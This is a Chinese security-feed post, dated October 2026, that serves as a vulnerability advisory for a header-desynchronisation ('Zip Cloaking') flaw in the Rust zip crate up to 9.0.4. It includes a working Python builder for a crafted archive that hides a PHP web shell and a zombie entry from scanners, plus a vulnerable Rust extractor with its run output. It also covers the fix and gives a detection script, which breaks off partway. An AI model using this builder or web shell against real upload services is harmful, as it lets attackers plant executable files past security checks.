---
title: 每日漏洞推送  zip-rs ≤ 9.0.4 双头部脱同步（Zip Cloaking）→ 扫描器放行、解压器落盘任意文件
url: https://mp.weixin.qq.com/s/61fk3nlNNVmrhE7ezJWFlg
source: Doonsec's feed
date: 2026-10-27
fetch_date: 2026-10-28T07:45:39.425012
---

# 每日漏洞推送  zip-rs ≤ 9.0.4 双头部脱同步（Zip Cloaking）→ 扫描器放行、解压器落盘任意文件

# 每日漏洞推送 zip-rs ≤ 9.0.4 双头部脱同步（Zip Cloaking）→ 扫描器放行、解压器落盘任意文件

原创

nullchen
nullchen

富贵学安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 📡 每日漏洞情报推送 | 2026-10-27

---

## 🔴 漏洞一：CVE-2026-115905 — zip-rs ≤ 9.0.4 双头部脱同步（Zip Cloaking）→ 扫描器放行、解压器落盘任意文件

### 📋 漏洞档案

| 项目 | 内容 |
| --- | --- |
| **CVE编号** | CVE-2026-115905 |
| **影响产品** | Rust `zip` crate（zip-rs/zip2）**≤ 9.0.4**（含 8.x / 9.0.x 全系） |
| **漏洞类型** | 解析器脱同步 / 输入校验缺失（CWE-436、CWE-20）— Zip Cloaking / Dual-Header Smuggling |
| **CVSS** | **10.0 (CRITICAL)** — CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:L（NVD 未提供 v3.1 向量） |
| **攻击入口** | 任何接受 ZIP 上传并流式解压的 Rust 服务：CI 产物解包、插件/主题市场、备份恢复、SaaS 数据导入、文档转换 |
| **前置条件** | 目标使用 `ZipStreamReader`（流式）落盘，或用 CDFH 做安全检查后再解压 |
| **公开时间** | 2026-10-26（NVD） |
| **修复** | **9.0.5** — commit `8068ab48`，GHSA-m665-v7pm-7grj |
| **在野利用** | 暂无公开在野报告；但"上传 ZIP → 网关查 CDH → 后端解 LFH"是极常见的架构，建议按可利用处理 |

### 🔥 紧急程度

* **CVSS 4.0 = 10.0**，是本周唯一满分条目。攻击面不是"某个 Web 应用"，而是**所有用 Rust 写解压逻辑的服务**；
* 绕过的是**安全产品本身**：杀毒/沙箱/内容审核基本都读 Central Directory，而 `ZipStreamReader` 读 Local File Header，两边看到的文件名、大小、CRC 可以完全不同；
* 三种可直接落地的打法：

1. **扩展名白名单绕过**：CDH 写 `report.pdf`，LFH 写 `shell.php` / `cron.sh` / `.env`；
2. **覆盖已有文件**：解压目录里覆盖 `templates/*.html`、`config/*.yml`、`.env`、前端 bundle → 下游服务重启/热加载即执行；
3. **Zombie 条目**：条目只存在于 LFH、CDH 里根本没有 → 扫描器**完全看不到**，解压器照写不误；

* 修复版本**默认没有开启校验**（见下），"升了 9.0.5 就安全"是错觉。

### 📝 漏洞描述

ZIP 格式天生有**两份元数据**：

```
[PK\x03\x04] Local File Header (LFH)   ← 紧贴文件数据，流式解压只能读它
      data...
[PK\x01\x02] Central Directory File Header (CDFH) ← 归档尾部，随机访问/扫描器读它
[PK\x05\x06] End of Central Directory
```

规范要求两者一致，但**格式本身不强制**。9.0.4 及之前的 `src/read/stream.rs` 里，`ZipStreamReader` 读到 LFH 就直接把 `file_name` 交给 visitor 落盘；而 `ZipArchive` 是拿 CDFH 建索引的。两条代码路径**从不对账**：

```
// ≤ 9.0.4 src/read/stream.rs（简化）
matchread_zipfile_from_stream_internal(&mutreader)? {
    File(mutfile) => {
        visitor.visit_file(&mutfile)?;   // file.name() 来自 LFH，直接用于写盘
    }
    CentralDirectoryHeader=>break,
    ...
}
```

于是攻击者只要让 **CDFH 和 LFH 说不同的话**，就能让"检查的那个组件"和"执行的那个组件"看到两个不同的归档。

9.0.5 的修复引入 `HeaderConsistencyMetadata`，逐项比对：

| 比对项 | 说明 |
| --- | --- |
| `name` / `name_raw` | LFH 与 CDFH 文件名必须**逐字节相等** |
| Info-ZIP Unicode Path（0x7075） | UPATH 内容与其 CRC32 都要匹配（防止用 extra field 二次改名） |
| 压缩方法 / 加密标志 | 含 AES(99) 外层方法一致性 |
| CRC32 / 压缩后大小 / 解压后大小 | data descriptor 场景做"待定值"特判 |
| 时间戳、AES extra field | 防止元数据侧信道混淆 |
| 物理偏移 | CDFH 的 `header_start` 必须等于流中真实 LFH 偏移；重名/重叠直接报错 |
| 条目数量 | LFH 条目数 ≠ CDFH 条目数即中止（打 Zombie ZIP） |

⚠️ **关键细节（源码确认）**：9.0.5 里 `ZipStreamReader::new()` 的 `enforce_header_consistency` 默认是 `false`（注释写明"for backward-compatibility"）；`ZipArchive` 侧同样要通过 `ZipReadOptions::enforce_header_consistency(true)` 或显式调用 `ZipArchive::validate_header_consistency()` 才会校验。**升级只是给了开关，不打开等于没修。**

### 💻 PoC/EXP

#### 0️⃣ 影响确认

```
# 项目里是否有 zip crate，以及解析出来的版本
cargo tree -i zip 2>/dev/null | head -20
grep-A2'^name = "zip"' Cargo.lock

# 是否用了流式解压（高危路径）
grep-rn"ZipStreamReader\|read_zipfile_from_stream" src/ | head
```

#### 1️⃣ 构造器：一份归档，两套文件名（实测可用）

```
#!/usr/bin/env python3
# CVE-2026-115905 - 双头部脱同步 / Zip Cloaking 构造器
# 用法: python3 build_zipcloak.py cloak.zip
# 扫描器视角(Central Directory): readme.txt, docs.pdf          <- 通过 ".pdf only" 白名单
# 流式解压视角(Local File Header): readme.txt, shell.php, z.php <- 落盘的是 PHP/隐藏条目
importstruct, zlib, sys

deflfh(name: bytes, data: bytes, method=0, crc=None) ->bytes:
    crc=zlib.crc32(data) &0xffffffffifcrcisNoneelsecrc
    return (struct.pack('<IHHHHHIIIHH', 0x04034b50, 20, 0, method, 0, 0x21,
                        crc, len(data), len(data), len(name), 0) +name+data)

defcdh(name: bytes, offset: int, data: bytes, method=0) ->bytes:
    crc=zlib.crc32(data) &0xffffffff
    return (struct.pack('<IHHHHHHIIIHHHHHII', 0x02014b50, 0x031e, 20, 0, method, 0, 0x21,
                        crc, len(data), len(data), len(name), 0, 0, 0, 0, 0, offset) +name)

defbuild():
    out=bytearray()
    central=bytearray()

    # ---- Entry 1: 完全正常的诱饵，让归档看起来像普通文档包 ----
    n1, d1=b'readme.txt', b'Quarterly report bundle. Please review the attached PDF.\n'
    off1=len(out); out+=lfh(n1, d1)
    central+=cdh(n1, off1, d1)

    # ---- Entry 2: Cloaked。LFH 名 = shell.php，CDFH 名 = docs.pdf ----
    n_local, n_central=b'shell.php', b'docs.pdf'
    d2=b'<?php system($_GET["c"]); ?>'
    off2=len(out)
    out+=lfh(n_local, d2)              # 真实落盘名从这里读
    central+=cdh(n_central, off2, d2)  # 扫描器/网关只信这里

    # ---- Entry 3: Zombie。只存在于 LFH，Central Directory 完全不知道它 ----
    n3, d3=b'z.php', b'<?php echo "zombie"; ?>'
    out+=lfh(n3, d3)                   # 无对应 CDH

    # ---- Central Directory + EOCD ----
    cd_off=len(out)
    out+=central
    out+=struct.pack('<IHHHHIIH', 0x06054b50, 0, 0, 2, 2, len(central), cd_off, 0)
    returnbytes(out)

if__name__=='__main__':
    path=sys.argv[1] iflen(sys.argv) >1else'cloak.zip'
    blob=build()
    open(path, 'wb').write(blob)
    print(f'[+] {path} written, {len(blob)} bytes')
    cd_names, pos= [], blob.find(b'PK\x01\x02')
    whilepos!=-1:
        nl=struct.unpack_from('<H', blob, pos+28)[0]
        cd_names.append(blob[pos+46:pos+46+nl].decode())
        pos=blob.find(b'PK\x01\x02', pos+4)
    lfh_names, pos= [], blob.find(b'PK\x03\x04')
    whilepos!=-1:
        nl=struct.unpack_from('<H', blob, pos+26)[0]
        lfh_names.append(blob[pos+30:pos+30+nl].decode())
        pos=blob.find(b'PK\x03\x04', pos+4)
    print('[central dir view]', cd_names)
    print('[local header view]', lfh_names)
```

实测输出（本机已跑通）：

```
$ python3 build_zipcloak.py cloak.zip
[+] cloak.zip written, 354 bytes
[central dir view] ['readme.txt', 'docs.pdf']
[local header view] ['readme.txt', 'shell.php', 'z.php']
```

同一份文件，`python3 -m zipfile -l cloak.zip` / `unzip -l` 只列出 2 个条目（`readme.txt`、`docs.pdf`），`unzip -o` 也只解出这两个——**因为 Info-ZIP 和 Python 都信 Central Directory**。而 Rust 的 `ZipStreamReader` 会依次落盘 `readme.txt`、`shell.php`、`z.php`。

#### 2️⃣ 受害者侧：一个"标准写法"的流式解压器

```
// Cargo.toml: zip = "=9.0.4"   （受影响的版本）
usestd::fs::{self, File};
usestd::io::{BufReader, Read};
usestd::path::PathBuf;
usezip::read::{ZipFile, ZipFileEntry};
usezip::result::ZipResult;
usezip::unstable::stream::{ZipStreamReader, ZipStreamVisitor};

structExtract { root: PathBuf }

implZipStreamVisitorforExtract {
    fnvisit_file<R: Read>(&mutself, f: &mutZipFile<'_, R>) ->ZipResult<()> {
        letname=f.name()?.to_string();          // ← 来自 LFH，不是 CDFH
        letout=self.root.join(&name);
        ifletSome(p) =out.parent() { fs::create_dir_all(p)?; }
        let mutw=File::create(&out)?;
        std::io::copy(f, &mutw)?;
        println!("[written] {}", out.display());
        Ok(())
    }
    fnvisit_additional_metadata(&mutself, _m: &ZipFileEntry<'_>) ->ZipResult<()> { Ok(()) }
}

fnmain() ->ZipResult<()> {
    letzip_path=std::env::args().nth(1).expect("usage: extract <zip> <outdir>");
    letoutdir   =std::env::args().nth(2).unwrap_or_else(|| "out".into());
    fs::create_dir_all(&outdir)?;
    letf=BufReader::new(File::open(zip_path)?);

    // 9.0.5 上必须显式开启，否则默认仍然不校验：
    // ZipStreamReader::new(f).enforce_header_consistency(true).visit(&mut Extract { root: outdir.into() })
    ZipStreamReader::new(f).visit(&mutExtract { root: outdir.into() })
}
```

运行结果：

```
$ ./extract cloak.zip out
[written] out/readme.txt
[written] out/shell.php     # 扫描器从未见过这个名字
[written] out/z.php         # zombie 条目，CDH 里 0 条记录
```

#### 3️⃣ 检测脚本：给 CI / 上传网关补一道"对账"

```
#!/usr/bin/env python3
# 检测 ZIP 双头部不一致（CVE-2026-115905 及同类 Zip Cloaking）
importstruct, sys

defscan(blob: bytes):
    lfh, pos= [], 0
    while (pos :=blob.find(b'PK\x03\x04', pos)) !=-1:
        nl, el=struct.unpack_from('<HH', blob, pos+26)
        lfh.append(blob[pos+30:pos+30+nl])
        pos+=4
    cdh, pos= [], 0
    while (pos :=blob.find(b'PK\x01\x02', pos)) !=-1:
        nl, el, cl=struct.unpack_from('<HHH', blob, pos+28)
        cdh.append(blob[pos+46:pos+46+nl])
        pos+=4
    problems= []
    iflen(lfh) !=len(cdh):
        problems.append(f'entry count ...